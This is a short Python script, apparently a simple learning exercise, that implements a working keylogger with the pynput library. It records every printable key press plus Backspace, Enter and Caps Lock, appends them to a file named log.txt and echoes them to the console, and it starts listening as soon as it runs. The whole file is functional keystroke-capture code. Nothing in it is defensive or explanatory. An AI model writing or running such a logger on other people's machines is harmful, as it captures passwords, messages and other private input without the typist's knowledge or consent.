import pynput.keyboard
from pynput.keyboard import Key

class SimpleClassLogger:
    def __init__(self):
        self.logger = ""

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        with open("log.txt", "a", encoding="utf-8") as new_file:
            new_file.write(self.logger)
        print(self.logger, end="", flush=True)
        self.logger = ""

    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
            # log letters, numbers, punctuation
            if pressed_key.isprintable():
                self.append_to_log(pressed_key)
        except AttributeError:
            if key == Key.backspace:
                self.append_to_log("[BACKSPACE]")
            elif key == Key.enter:
                self.append_to_log("[ENTER]") #includes ENTER key
            elif key == Key.caps_lock:
                self.append_to_log("[CAPSLOCK]") #includes CAPSLOCK key
            else:             
                pass

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

SimpleClassLogger().start()